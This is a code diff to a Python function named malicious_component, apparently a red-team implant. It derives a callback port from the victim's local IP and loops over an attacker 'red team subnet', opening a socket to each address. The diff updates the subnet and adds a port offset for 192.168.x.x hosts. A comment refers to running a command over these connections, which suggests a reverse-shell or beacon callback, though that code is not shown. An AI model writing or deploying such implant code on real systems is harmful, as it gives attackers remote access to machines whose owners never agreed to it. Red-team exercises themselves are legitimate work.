@@ -59,10 +59,13 @@ def malicious_component():
     local_ip = str(get_local_ip())
     octets = local_ip.split(".")
     RPORT = (int(octets[2]) * 10000) + int(octets[3]) 
+    # Consideration for 192.168.x.x (cloud boxes). Just add 500 to the port 
+    if octets[0] == '192':
+        RPORT = RPORT + 500
     #print(f"RPORT: {RPORT}")
     
     for index in range(1, 255):
-        RHOST = "10.0.20." + str(index) # Red team subnet
+        RHOST = "10.20.0." + str(index) # Corrected red team subnet since it changed
         #RHOST = "100.94.45." + str(index) # My test tailscale net
         try:
             # Create new thread for every attempted socket so that command doesn't take a while to execute
